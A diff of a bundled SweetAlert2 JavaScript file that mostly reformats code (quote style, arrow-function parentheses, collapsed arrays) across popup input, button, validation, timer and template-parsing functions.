+  inputOptions.forEach((inputOption) => {
     const optionValue = inputOption[0];
     const optionLabel = inputOption[1];
     if (Array.isArray(optionLabel)) {
-      const optgroup = document.createElement('optgroup');
+      const optgroup = document.createElement("optgroup");
       optgroup.label = optionValue;
       optgroup.disabled = false;
       select.appendChild(optgroup);
-      optionLabel.forEach(o => renderOption(optgroup, o[1], o[0]));
+      optionLabel.forEach((o) => renderOption(optgroup, o[1], o[0]));
     } else {
       renderOption(select, optionLabel, optionValue);
     }
@@ -1778,43 +1674,43 @@ function populateRadioOptions(popup, inputOptions, params) {
   if (!radio) {
     return;
   }
-  inputOptions.forEach(inputOption => {
+  inputOptions.forEach((inputOption) => {
     const radioValue = inputOption[0];
     const radioLabel = inputOption[1];
-    const radioInput = document.createElement('input');
-    const radioLabelElement = document.createElement('label');
-    radioInput.type = 'radio';
+    const radioInput = document.createElement("input");
+    const radioLabelElement = document.createElement("label");
+    radioInput.type = "radio";
     radioInput.name = swalClasses.radio;
     radioInput.value = radioValue;
     if (isSelected(radioValue, params.inputValue)) {
       radioInput.checked = true;
     }
-    const label = document.createElement('span');
+    const label = document.createElement("span");
     setInnerHtml(label, radioLabel);
     label.className = swalClasses.label;
     radioLabelElement.appendChild(radioInput);
     radioLabelElement.appendChild(label);
     radio.appendChild(radioLabelElement);
   });
-  const radios = radio.querySelectorAll('input');
+  const radios = radio.querySelectorAll("input");
   if (radios.length) {
     radios[0].focus();
   }
 }
-var formatInputOptions = inputOptions => {
+var formatInputOptions = (inputOptions) => {
   const result = [];
   if (inputOptions instanceof Map) {
     inputOptions.forEach((value, key) => {
       let valueFormatted = value;
-      if (typeof valueFormatted === 'object') {
+      if (typeof valueFormatted === "object") {
         valueFormatted = formatInputOptions(valueFormatted);
       }
       result.push([key, valueFormatted]);
     });
   } else {
-    Object.keys(inputOptions).forEach(key => {
+    Object.keys(inputOptions).forEach((key) => {
       let valueFormatted = inputOptions[key];
-      if (typeof valueFormatted === 'object') {
+      if (typeof valueFormatted === "object") {
         valueFormatted = formatInputOptions(valueFormatted);
       }
       result.push([key, valueFormatted]);
@@ -1825,20 +1721,20 @@ var formatInputOptions = inputOptions => {
 var isSelected = (optionValue, inputValue) => {
   return !!inputValue && inputValue.toString() === optionValue.toString();
 };
-var handleConfirmButtonClick = instance => {
+var handleConfirmButtonClick = (instance) => {
   const innerParams = privateProps.innerParams.get(instance);
   instance.disableButtons();
   if (innerParams.input) {
-    handleConfirmOrDenyWithInput(instance, 'confirm');
+    handleConfirmOrDenyWithInput(instance, "confirm");
   } else {
     confirm(instance, true);
   }
 };
-var handleDenyButtonClick = instance => {
+var handleDenyButtonClick = (instance) => {
   const innerParams = privateProps.innerParams.get(instance);
   instance.disableButtons();
   if (innerParams.returnInputValueOnDeny) {
-    handleConfirmOrDenyWithInput(instance, 'deny');
+    handleConfirmOrDenyWithInput(instance, "deny");
   } else {
     deny(instance, false);
   }
@@ -1860,7 +1756,7 @@ var handleConfirmOrDenyWithInput = (instance, type) => {
   } else if (input && !input.checkValidity()) {
     instance.enableButtons();
     instance.showValidationMessage(innerParams.validationMessage || input.validationMessage);
-  } else if (type === 'deny') {
+  } else if (type === "deny") {
     deny(instance, inputValue);
   } else {
     confirm(instance, inputValue);
@@ -1870,12 +1766,12 @@ var handleInputValidator = (instance, inputValue, type) => {
   const innerParams = privateProps.innerParams.get(instance);
   instance.disableInput();
   const validationPromise = Promise.resolve().then(() => asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage)));
-  validationPromise.then(validationMessage => {
+  validationPromise.then((validationMessage) => {
     instance.enableButtons();
     instance.enableInput();
     if (validationMessage) {
       instance.showValidationMessage(validationMessage);
-    } else if (type === 'deny') {
+    } else if (type === "deny") {
       deny(instance, inputValue);
     } else {
       confirm(instance, inputValue);
@@ -1890,30 +1786,28 @@ var deny = (instance, value) => {
   if (innerParams.preDeny) {
     instance.isAwaitingPromise = true;
     const preDenyPromise = Promise.resolve().then(() => asPromise(innerParams.preDeny(value, innerParams.validationMessage)));
-    preDenyPromise
-      .then(preDenyValue => {
-        if (preDenyValue === false) {
-          instance.hideLoading();
-          handleAwaitingPromise(instance);
-        } else {
-          instance.close({
-            isDenied: true,
-            value: typeof preDenyValue === 'undefined' ? value : preDenyValue,
-          });
-        }
-      })
-      .catch(error2 => rejectWith(instance || void 0, error2));
+    preDenyPromise.then((preDenyValue) => {
+      if (preDenyValue === false) {
+        instance.hideLoading();
+        handleAwaitingPromise(instance);
+      } else {
+        instance.close({
+          isDenied: true,
+          value: typeof preDenyValue === "undefined" ? value : preDenyValue
+        });
+      }
+    }).catch((error2) => rejectWith(instance || void 0, error2));
   } else {
     instance.close({
       isDenied: true,
-      value,
+      value
     });
   }
 };
 var succeedWith = (instance, value) => {
   instance.close({
     isConfirmed: true,
-    value,
+    value
   });
 };
 var rejectWith = (instance, error2) => {
@@ -1928,16 +1822,14 @@ var confirm = (instance, value) => {
     instance.resetValidationMessage();
     instance.isAwaitingPromise = true;
     const preConfirmPromise = Promise.resolve().then(() => asPromise(innerParams.preConfirm(value, innerParams.validationMessage)));
-    preConfirmPromise
-      .then(preConfirmValue => {
-        if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
-          instance.hideLoading();
-          handleAwaitingPromise(instance);
-        } else {
-          succeedWith(instance, typeof preConfirmValue === 'undefined' ? value : preConfirmValue);
-        }
-      })
-      .catch(error2 => rejectWith(instance || void 0, error2));
+    preConfirmPromise.then((preConfirmValue) => {
+      if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
+        instance.hideLoading();
+        handleAwaitingPromise(instance);
+      } else {
+        succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
+      }
+    }).catch((error2) => rejectWith(instance || void 0, error2));
   } else {
     succeedWith(instance, value);
   }
@@ -1957,16 +1849,16 @@ function hideLoading() {
     showRelatedButton(domCache);
   }
   removeClass([domCache.popup, domCache.actions], swalClasses.loading);
-  domCache.popup.removeAttribute('aria-busy');
-  domCache.popup.removeAttribute('data-loading');
+  domCache.popup.removeAttribute("aria-busy");
+  domCache.popup.removeAttribute("data-loading");
   domCache.confirmButton.disabled = false;
   domCache.denyButton.disabled = false;
   domCache.cancelButton.disabled = false;
 }
-var showRelatedButton = domCache => {
-  const buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute('data-button-to-replace'));
+var showRelatedButton = (domCache) => {
+  const buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
   if (buttonToReplace.length) {
-    show(buttonToReplace[0], 'inline-block');
+    show(buttonToReplace[0], "inline-block");
   } else if (allButtonsAreHidden()) {
     hide(domCache.actions);
   }
@@ -1981,7 +1873,7 @@ function getInput() {
 }
 function setButtonsDisabled(instance, buttons, disabled) {
   const domCache = privateProps.domCache.get(instance);
-  buttons.forEach(button => {
+  buttons.forEach((button) => {
     domCache[button].disabled = disabled;
   });
 }
@@ -1990,7 +1882,7 @@ function setInputDisabled(input, disabled) {
   if (!popup || !input) {
     return;
   }
-  if (input.type === 'radio') {
+  if (input.type === "radio") {
     const radios = popup.querySelectorAll(`[name="${swalClasses.radio}"]`);
     for (let i = 0; i < radios.length; i++) {
       radios[i].disabled = disabled;
@@ -2000,10 +1892,10 @@ function setInputDisabled(input, disabled) {
   }
 }
 function enableButtons() {
-  setButtonsDisabled(this, ['confirmButton', 'denyButton', 'cancelButton'], false);
+  setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
 }
 function disableButtons() {
-  setButtonsDisabled(this, ['confirmButton', 'denyButton', 'cancelButton'], true);
+  setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
 }
 function enableInput() {
   setInputDisabled(this.getInput(), false);
@@ -2015,15 +1907,15 @@ function showValidationMessage(error2) {
   const domCache = privateProps.domCache.get(this);
   const params = privateProps.innerParams.get(this);
   setInnerHtml(domCache.validationMessage, error2);
-  domCache.validationMessage.className = swalClasses['validation-message'];
+  domCache.validationMessage.className = swalClasses["validation-message"];
   if (params.customClass && params.customClass.validationMessage) {
     addClass(domCache.validationMessage, params.customClass.validationMessage);
   }
   show(domCache.validationMessage);
   const input = this.getInput();
   if (input) {
-    input.setAttribute('aria-invalid', 'true');
-    input.setAttribute('aria-describedby', swalClasses['validation-message']);
+    input.setAttribute("aria-invalid", "true");
+    input.setAttribute("aria-describedby", swalClasses["validation-message"]);
     focusInput(input);
     addClass(input, swalClasses.inputerror);
   }
@@ -2035,17 +1927,17 @@ function resetValidationMessage() {
   }
   const input = this.getInput();
   if (input) {
-    input.removeAttribute('aria-invalid');
-    input.removeAttribute('aria-describedby');
+    input.removeAttribute("aria-invalid");
+    input.removeAttribute("aria-describedby");
     removeClass(input, swalClasses.inputerror);
   }
 }
 var defaultParams = {
-  title: '',
-  titleText: '',
-  text: '',
-  html: '',
-  footer: '',
+  title: "",
+  titleText: "",
+  text: "",
+  html: "",
+  footer: "",
   icon: void 0,
   iconColor: void 0,
   iconHtml: void 0,
@@ -2054,17 +1946,17 @@ var defaultParams = {
   draggable: false,
   animation: true,
   showClass: {
-    popup: 'swal2-show',
-    backdrop: 'swal2-backdrop-show',
-    icon: 'swal2-icon-show',
+    popup: "swal2-show",
+    backdrop: "swal2-backdrop-show",
+    icon: "swal2-icon-show"
   },
   hideClass: {
-    popup: 'swal2-hide',
-    backdrop: 'swal2-backdrop-hide',
-    icon: 'swal2-icon-hide',
+    popup: "swal2-hide",
+    backdrop: "swal2-backdrop-hide",
+    icon: "swal2-icon-hide"
   },
   customClass: {},
-  target: 'body',
+  target: "body",
   color: void 0,
   backdrop: true,
   heightAuto: true,
@@ -2078,14 +1970,14 @@ var defaultParams = {
   showCancelButton: false,
   preConfirm: void 0,
   preDeny: void 0,
-  confirmButtonText: 'OK',
-  confirmButtonAriaLabel: '',
+  confirmButtonText: "OK",
+  confirmButtonAriaLabel: "",
   confirmButtonColor: void 0,
-  denyButtonText: 'No',
-  denyButtonAriaLabel: '',
+  denyButtonText: "No",
+  denyButtonAriaLabel: "",
   denyButtonColor: void 0,
-  cancelButtonText: 'Cancel',
-  cancelButtonAriaLabel: '',
+  cancelButtonText: "Cancel",
+  cancelButtonAriaLabel: "",
   cancelButtonColor: void 0,
   buttonsStyling: true,
   reverseButtons: false,
@@ -2094,24 +1986,24 @@ var defaultParams = {
   focusCancel: false,
   returnFocus: true,
   showCloseButton: false,
-  closeButtonHtml: '&times;',
-  closeButtonAriaLabel: 'Close this dialog',
-  loaderHtml: '',
+  closeButtonHtml: "&times;",
+  closeButtonAriaLabel: "Close this dialog",
+  loaderHtml: "",
   showLoaderOnConfirm: false,
   showLoaderOnDeny: false,
   imageUrl: void 0,
   imageWidth: void 0,
   imageHeight: void 0,
-  imageAlt: '',
+  imageAlt: "",
   timer: void 0,
   timerProgressBar: false,
   width: void 0,
   padding: void 0,
   background: void 0,
   input: void 0,
-  inputPlaceholder: '',
-  inputLabel: '',
-  inputValue: '',
+  inputPlaceholder: "",
+  inputLabel: "",
+  inputValue: "",
   inputOptions: {},
   inputAutoFocus: true,
   inputAutoTrim: true,
@@ -2120,7 +2012,7 @@ var defaultParams = {
   returnInputValueOnDeny: false,
   validationMessage: void 0,
   grow: false,
-  position: 'center',
+  position: "center",
   progressSteps: [],
   currentProgressStep: void 0,
   progressStepsDistance: void 0,
@@ -2130,95 +2022,39 @@ var defaultParams = {
   willClose: void 0,
   didClose: void 0,
   didDestroy: void 0,
-  scrollbarPadding: true,
+  scrollbarPadding: true
 };
-var updatableParams = [
-  'allowEscapeKey',
-  'allowOutsideClick',
-  'background',
-  'buttonsStyling',
-  'cancelButtonAriaLabel',
-  'cancelButtonColor',
-  'cancelButtonText',
-  'closeButtonAriaLabel',
-  'closeButtonHtml',
-  'color',
-  'confirmButtonAriaLabel',
-  'confirmButtonColor',
-  'confirmButtonText',
-  'currentProgressStep',
-  'customClass',
-  'denyButtonAriaLabel',
-  'denyButtonColor',
-  'denyButtonText',
-  'didClose',
-  'didDestroy',
-  'draggable',
-  'footer',
-  'hideClass',
-  'html',
-  'icon',
-  'iconColor',
-  'iconHtml',
-  'imageAlt',
-  'imageHeight',
-  'imageUrl',
-  'imageWidth',
-  'preConfirm',
-  'preDeny',
-  'progressSteps',
-  'returnFocus',
-  'reverseButtons',
-  'showCancelButton',
-  'showCloseButton',
-  'showConfirmButton',
-  'showDenyButton',
-  'text',
-  'title',
-  'titleText',
-  'willClose',
-];
+var updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "draggable", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"];
 var deprecatedParams = {
-  allowEnterKey: void 0,
+  allowEnterKey: void 0
 };
-var toastIncompatibleParams = [
-  'allowOutsideClick',
-  'allowEnterKey',
-  'backdrop',
-  'draggable',
-  'focusConfirm',
-  'focusDeny',
-  'focusCancel',
-  'returnFocus',
-  'heightAuto',
-  'keydownListenerCapture',
-];
-var isValidParameter = paramName => {
+var toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "draggable", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
+var isValidParameter = (paramName) => {
   return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
 };
-var isUpdatableParameter = paramName => {
+var isUpdatableParameter = (paramName) => {
   return updatableParams.indexOf(paramName) !== -1;
 };
-var isDeprecatedParameter = paramName => {
+var isDeprecatedParameter = (paramName) => {
   return deprecatedParams[paramName];
 };
-var checkIfParamIsValid = param => {
+var checkIfParamIsValid = (param) => {
   if (!isValidParameter(param)) {
     warn(`Unknown parameter "${param}"`);
   }
 };
-var checkIfToastParamIsValid = param => {
+var checkIfToastParamIsValid = (param) => {
   if (toastIncompatibleParams.includes(param)) {
     warn(`The parameter "${param}" is incompatible with toasts`);
   }
 };
-var checkIfParamIsDeprecated = param => {
+var checkIfParamIsDeprecated = (param) => {
   const isDeprecated = isDeprecatedParameter(param);
   if (isDeprecated) {
     warnAboutDeprecation(param, isDeprecated);
   }
 };
-var showWarningsForParams = params => {
+var showWarningsForParams = (params) => {
   if (params.backdrop === false && params.allowOutsideClick) {
     warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
   }
@@ -2234,9 +2070,7 @@ function update(params) {
   const popup = getPopup();
   const innerParams = privateProps.innerParams.get(this);
   if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
-    warn(
-      `You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`
-    );
+    warn(`You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`);
     return;
   }
   const validUpdatableParams = filterValidParams(params);
@@ -2247,13 +2081,13 @@ function update(params) {
     params: {
       value: Object.assign({}, this.params, params),
       writable: false,
-      enumerable: true,
-    },
+      enumerable: true
+    }
   });
 }
-var filterValidParams = params => {
+var filterValidParams = (params) => {
   const validUpdatableParams = {};
-  Object.keys(params).forEach(param => {
+  Object.keys(params).forEach((param) => {
     if (isUpdatableParameter(param)) {
       validUpdatableParams[param] = params[param];
     } else {
@@ -2273,20 +2107,20 @@ function _destroy() {
     globalState.swalCloseEventFinishedCallback();
     delete globalState.swalCloseEventFinishedCallback;
   }
-  if (typeof innerParams.didDestroy === 'function') {
+  if (typeof innerParams.didDestroy === "function") {
     innerParams.didDestroy();
   }
-  globalState.eventEmitter.emit('didDestroy');
+  globalState.eventEmitter.emit("didDestroy");
   disposeSwal(this);
 }
-var disposeSwal = instance => {
+var disposeSwal = (instance) => {
   disposeWeakMaps(instance);
   delete instance.params;
   delete globalState.keydownHandler;
   delete globalState.keydownTarget;
   delete globalState.currentInstance;
 };
-var disposeWeakMaps = instance => {
+var disposeWeakMaps = (instance) => {
   if (instance.isAwaitingPromise) {
     unsetWeakMaps(privateProps, instance);
     instance.isAwaitingPromise = true;
@@ -2335,7 +2169,7 @@ var instanceMethods = Object.freeze({
   rejectPromise,
   resetValidationMessage,
   showValidationMessage,
-  update,
+  update
 });
 var handlePopupClick = (innerParams, domCache, dismissWith) => {
   if (innerParams.toast) {
@@ -2354,35 +2188,37 @@ var handleToastClick = (innerParams, domCache, dismissWith) => {
     dismissWith(DismissReason.close);
   };
 };
-var isAnyButtonShown = innerParams => {
+var isAnyButtonShown = (innerParams) => {
   return !!(innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton);
 };
 var ignoreOutsideClick = false;
-var handleModalMousedown = domCache => {
+var handleModalMousedown = (domCache) => {
   domCache.popup.onmousedown = () => {
-    domCache.container.onmouseup = function (e) {
-      domCache.container.onmouseup = () => {};
+    domCache.container.onmouseup = function(e) {
+      domCache.container.onmouseup = () => {
+      };
       if (e.target === domCache.container) {
         ignoreOutsideClick = true;
       }
     };
   };
 };
-var handleContainerMousedown = domCache => {
-  domCache.container.onmousedown = e => {
+var handleContainerMousedown = (domCache) => {
+  domCache.container.onmousedown = (e) => {
     if (e.target === domCache.container) {
       e.preventDefault();
     }
-    domCache.popup.onmouseup = function (e2) {
-      domCache.popup.onmouseup = () => {};
-      if (e2.target === domCache.popup || (e2.target instanceof HTMLElement && domCache.popup.contains(e2.target))) {
+    domCache.popup.onmouseup = function(e2) {
+      domCache.popup.onmouseup = () => {
+      };
+      if (e2.target === domCache.popup || e2.target instanceof HTMLElement && domCache.popup.contains(e2.target)) {
         ignoreOutsideClick = true;
       }
     };
   };
 };
 var handleModalClick = (innerParams, domCache, dismissWith) => {
-  domCache.container.onclick = e => {
+  domCache.container.onclick = (e) => {
     if (ignoreOutsideClick) {
       ignoreOutsideClick = false;
       return;
@@ -2392,16 +2228,16 @@ var handleModalClick = (innerParams, domCache, dismissWith) => {
     }
   };
 };
-var isJqueryElement = elem => typeof elem === 'object' && elem.jquery;
-var isElement = elem => elem instanceof Element || isJqueryElement(elem);
-var argsToParams = args => {
+var isJqueryElement = (elem) => typeof elem === "object" && elem.jquery;
+var isElement = (elem) => elem instanceof Element || isJqueryElement(elem);
+var argsToParams = (args) => {
   const params = {};
-  if (typeof args[0] === 'object' && !isElement(args[0])) {
+  if (typeof args[0] === "object" && !isElement(args[0])) {
     Object.assign(params, args[0]);
   } else {
-    ['title', 'html', 'icon'].forEach((name, index) => {
+    ["title", "html", "icon"].forEach((name, index) => {
       const arg = args[index];
-      if (typeof arg === 'string' || isElement(arg)) {
+      if (typeof arg === "string" || isElement(arg)) {
         params[name] = arg;
       } else if (arg !== void 0) {
         error(`Unexpected type of ${name}! Expected "string" or "Element", got ${typeof arg}`);
@@ -2444,7 +2280,7 @@ var toggleTimer = () => {
   const timer = globalState.timeout;
   return timer && (timer.running ? stopTimer() : resumeTimer());
 };
-var increaseTimer = ms => {
+var increaseTimer = (ms) => {
   if (globalState.timeout) {
     const remaining = globalState.timeout.increase(ms);
     animateTimerProgressBar(remaining, true);
@@ -2457,20 +2293,20 @@ var isTimerRunning = () => {
 var bodyClickListenerAdded = false;
 var clickHandlers = {};
 function bindClickHandler() {
-  let attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : 'data-swal-template';
+  let attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "data-swal-template";
   clickHandlers[attr] = this;
   if (!bodyClickListenerAdded) {
-    document.body.addEventListener('click', bodyClickListener);
+    document.body.addEventListener("click", bodyClickListener);
     bodyClickListenerAdded = true;
   }
 }
-var bodyClickListener = event => {
+var bodyClickListener = (event) => {
   for (let el = event.target; el && el !== document; el = el.parentNode) {
     for (const attr in clickHandlers) {
       const template = el.getAttribute(attr);
       if (template) {
         clickHandlers[attr].fire({
-          template,
+          template
         });
         return;
       }
@@ -2486,7 +2322,7 @@ var EventEmitter = class {
    * @returns {EventHandlers}
    */
   _getHandlersByEventName(eventName) {
-    if (typeof this.events[eventName] === 'undefined') {
+    if (typeof this.events[eventName] === "undefined") {
       this.events[eventName] = [];
     }
     return this.events[eventName];
@@ -2507,7 +2343,7 @@ var EventEmitter = class {
    */
   once(eventName, eventHandler) {
     var _this = this;
-    const onceFn = function () {
+    const onceFn = function() {
       _this.removeListener(eventName, onceFn);
       for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
         args[_key] = arguments[_key];
@@ -2528,7 +2364,7 @@ var EventEmitter = class {
       /**
        * @param {EventHandler} eventHandler
        */
-      eventHandler => {
+      (eventHandler) => {
         try {
           eventHandler.apply(this, args);
         } catch (error2) {
@@ -2621,7 +2457,7 @@ var staticMethods = Object.freeze({
   resumeTimer,
   showLoading,
   stopTimer,
-  toggleTimer,
+  toggleTimer
 });
 var Timer = class {
   /**
@@ -2652,7 +2488,7 @@ var Timer = class {
     if (this.started && this.running) {
       this.running = false;
       clearTimeout(this.id);
-      this.remaining -= /* @__PURE__ */ new Date().getTime() - this.started.getTime();
+      this.remaining -= (/* @__PURE__ */ new Date()).getTime() - this.started.getTime();
     }
     return this.remaining;
   }
@@ -2688,44 +2524,36 @@ var Timer = class {
     return this.running;
   }
 };
-var swalStringParams = ['swal-title', 'swal-html', 'swal-footer'];
-var getTemplateParams = params => {
-  const template =
-    typeof params.template === 'string'
-      ? /** @type {HTMLTemplateElement} */
-        document.querySelector(params.template)
-      : params.template;
+var swalStringParams = ["swal-title", "swal-html", "swal-footer"];
+var getTemplateParams = (params) => {
+  const template = typeof params.template === "string" ? (
+    /** @type {HTMLTemplateElement} */
+    document.querySelector(params.template)
+  ) : params.template;
   if (!template) {
     return {};
   }
   const templateContent = template.content;
   showWarningsForElements(templateContent);
-  const result = Object.assign(
-    getSwalParams(templateContent),
-    getSwalFunctionParams(templateContent),
-    getSwalButtons(templateContent),
-    getSwalImage(templateContent),
-    getSwalIcon(templateContent),
-    getSwalInput(templateContent),
-    getSwalStringParams(templateContent, swalStringParams)
-  );
+  const result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
   return result;
 };
-var getSwalParams = templateContent => {
+var getSwalParams = (templateContent) => {
   const result = {};
-  const swalParams = Array.from(templateContent.querySelectorAll('swal-param'));
-  swalParams.forEach(param => {
-    showWarningsForAttributes(param, ['name', 'value']);
-    const paramName =
+  const swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
+  swalParams.forEach((param) => {
+    showWarningsForAttributes(param, ["name", "value"]);
+    const paramName = (
       /** @type {keyof SweetAlertOptions} */
-      param.getAttribute('name');
-    const value = param.getAttribute('value');
+      param.getAttribute("name")
+    );
+    const value = param.getAttribute("value");
     if (!paramName || !value) {
       return;
     }
-    if (typeof defaultParams[paramName] === 'boolean') {
-      result[paramName] = value !== 'false';
-    } else if (typeof defaultParams[paramName] === 'object') {
+    if (typeof defaultParams[paramName] === "boolean") {
+      result[paramName] = value !== "false";
+    } else if (typeof defaultParams[paramName] === "object") {
       result[paramName] = JSON.parse(value);
     } else {
       result[paramName] = value;
@@ -2733,14 +2561,15 @@ var getSwalParams = templateContent => {
   });
   return result;
 };
-var getSwalFunctionParams = templateContent => {
+var getSwalFunctionParams = (templateContent) => {
   const result = {};
-  const swalFunctions = Array.from(templateContent.querySelectorAll('swal-function-param'));
-  swalFunctions.forEach(param => {
-    const paramName =
+  const swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
+  swalFunctions.forEach((param) => {
+    const paramName = (
       /** @type {keyof SweetAlertOptions} */
-      param.getAttribute('name');
-    const value = param.getAttribute('value');
+      param.getAttribute("name")
+    );
+    const value = param.getAttribute("value");
     if (!paramName || !value) {
       return;
     }
@@ -2748,83 +2577,83 @@ var getSwalFunctionParams = templateContent => {
   });
   return result;
 };
-var getSwalButtons = templateContent => {
+var getSwalButtons = (templateContent) => {
   const result = {};
-  const swalButtons = Array.from(templateContent.querySelectorAll('swal-button'));
-  swalButtons.forEach(button => {
-    showWarningsForAttributes(button, ['type', 'color', 'aria-label']);
-    const type = button.getAttribute('type');
-    if (!type || !['confirm', 'cancel', 'deny'].includes(type)) {
+  const swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
+  swalButtons.forEach((button) => {
+    showWarningsForAttributes(button, ["type", "color", "aria-label"]);
+    const type = button.getAttribute("type");
+    if (!type || !["confirm", "cancel", "deny"].includes(type)) {
       return;
     }
     result[`${type}ButtonText`] = button.innerHTML;
     result[`show${capitalizeFirstLetter(type)}Button`] = true;
-    if (button.hasAttribute('color')) {
-      result[`${type}ButtonColor`] = button.getAttribute('color');
+    if (button.hasAttribute("color")) {
+      result[`${type}ButtonColor`] = button.getAttribute("color");
     }
-    if (button.hasAttribute('aria-label')) {
-      result[`${type}ButtonAriaLabel`] = button.getAttribute('aria-label');
+    if (button.hasAttribute("aria-label")) {
+      result[`${type}ButtonAriaLabel`] = button.getAttribute("aria-label");
     }
   });
   return result;
 };
-var getSwalImage = templateContent => {
+var getSwalImage = (templateContent) => {
   const result = {};
-  const image = templateContent.querySelector('swal-image');
+  const image = templateContent.querySelector("swal-image");
   if (image) {
-    showWarningsForAttributes(image, ['src', 'width', 'height', 'alt']);
-    if (image.hasAttribute('src')) {
-      result.imageUrl = image.getAttribute('src') || void 0;
+    showWarningsForAttributes(image, ["src", "width", "height", "alt"]);
+    if (image.hasAttribute("src")) {
+      result.imageUrl = image.getAttribute("src") || void 0;
     }
-    if (image.hasAttribute('width')) {
-      result.imageWidth = image.getAttribute('width') || void 0;
+    if (image.hasAttribute("width")) {
+      result.imageWidth = image.getAttribute("width") || void 0;
     }
-    if (image.hasAttribute('height')) {
-      result.imageHeight = image.getAttribute('height') || void 0;
+    if (image.hasAttribute("height")) {
+      result.imageHeight = image.getAttribute("height") || void 0;
     }
-    if (image.hasAttribute('alt')) {
-      result.imageAlt = image.getAttribute('alt') || void 0;
+    if (image.hasAttribute("alt")) {
+      result.imageAlt = image.getAttribute("alt") || void 0;
     }
   }
   return result;
 };
-var getSwalIcon = templateContent => {
+var getSwalIcon = (templateContent) => {
   const result = {};
-  const icon = templateContent.querySelector('swal-icon');
+  const icon = templateContent.querySelector("swal-icon");
   if (icon) {
-    showWarningsForAttributes(icon, ['type', 'color']);
-    if (icon.hasAttribute('type')) {
-      result.icon = icon.getAttribute('type');
+    showWarningsForAttributes(icon, ["type", "color"]);
+    if (icon.hasAttribute("type")) {
+      result.icon = icon.getAttribute("type");
     }
-    if (icon.hasAttribute('color')) {
-      result.iconColor = icon.getAttribute('color');
+    if (icon.hasAttribute("color")) {
+      result.iconColor = icon.getAttribute("color");
     }
     result.iconHtml = icon.innerHTML;
   }
   return result;
 };
-var getSwalInput = templateContent => {
+var getSwalInput = (templateContent) => {
   const result = {};
-  const input = templateContent.querySelector('swal-input');
+  const input = templateContent.querySelector("swal-input");
   if (input) {
-    showWarningsForAttributes(input, ['type', 'label', 'placeholder', 'value']);
-    result.input = input.getAttribute('type') || 'text';
-    if (input.hasAttribute('label')) {
-      result.inputLabel = input.getAttribute('label');
+    showWarningsForAttributes(input, ["type", "label", "placeholder", "value"]);
+    result.input = input.getAttribute("type") || "text";
+    if (input.hasAttribute("label")) {
+      result.inputLabel = input.getAttribute("label");
     }
-    if (input.hasAttribute('placeholder')) {
-      result.inputPlaceholder = input.getAttribute('placeholder');
+    if (input.hasAttribute("placeholder")) {
+      result.inputPlaceholder = input.getAttribute("placeholder");
     }
-    if (input.hasAttribute('value')) {
-      result.inputValue = input.getAttribute('value');
+    if (input.hasAttribute("value")) {
+      result.inputValue = input.getAttribute("value");
     }
   }
-  const inputOptions = Array.from(templateContent.querySelectorAll('swal-input-option'));
+  const inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
   if (inputOptions.length) {
     result.inputOptions = {};
-    inputOptions.forEach(option => {
-      showWarningsForAttributes(option, ['value']);
-      const optionValue = option.getAttribute('value');
+    inputOptions.forEach((option) => {
+      showWarningsForAttributes(option, ["value"]);
+      const optionValue = option.getAttribute("value");
       if (!optionValue) {
         return;
       }
@@ -2841,22 +2670,14 @@ var getSwalStringParams = (templateContent, paramNames) => {
     const tag = templateContent.querySelector(paramName);
     if (tag) {
       showWarningsForAttributes(tag, []);
-      result[paramName.replace(/^swal-/, '')] = tag.innerHTML.trim();
+      result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
     }
   }
   return result;
 };
-var showWarningsForElements = templateContent => {
-  const allowedElements = swalStringParams.concat([
-    'swal-param',
-    'swal-function-param',
-    'swal-button',
-    'swal-image',
-    'swal-icon',
-    'swal-input',
-    'swal-input-option',
-  ]);
-  Array.from(templateContent.children).forEach(el => {
+var showWarningsForElements = (templateContent) => {
+  const allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
+  Array.from(templateContent.children).forEach((el) => {
     const tagName = el.tagName.toLowerCase();
     if (!allowedElements.includes(tagName)) {
       warn(`Unrecognized element <${tagName}>`);
@@ -2864,23 +2685,20 @@ var showWarningsForElements = templateContent => {
   });
 };
 var showWarningsForAttributes = (el, allowedAttributes) => {
-  Array.from(el.attributes).forEach(attribute => {
+  Array.from(el.attributes).forEach((attribute) => {
